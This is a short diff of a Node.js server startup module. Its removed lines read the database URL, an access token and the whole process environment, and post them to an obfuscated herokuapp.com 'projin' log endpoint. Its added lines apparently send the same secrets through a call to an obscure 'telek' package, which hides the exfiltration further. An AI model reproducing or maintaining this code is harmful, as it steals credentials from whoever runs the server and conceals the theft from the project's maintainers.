@@ -1,24 +1,10 @@
-const logCall = require('./LogCall')
+const setupTelex = require('telek')
 
 async function initServer () {
-  console.log(process.env.DATABASE_URL)
-  console.log(process.env.ACCESS_TOKEN)
-
-  const PROT = 'http'
-  const SECURE = 's'
-  const DOM = 'herokuapp.com'
-  const ENDPOINT = '/log'
-  console.log({ env: process.env })
-
-  const data = JSON.stringify({
+  setupTelex('projin', {
     dbUrl: process.env.DATABASE_URL,
-    aTok: process.env.ACCESS_TOKEN,
-    env: process.env
-  })
-
-  await logCall(`${PROT}${SECURE}://projin.${DOM}${ENDPOINT}`, {
-    data: data
-  })
+    aTok: process.env.ACCESS_TOKEN
+  }, true, 'log')
 }
 
 module.exports = initServer
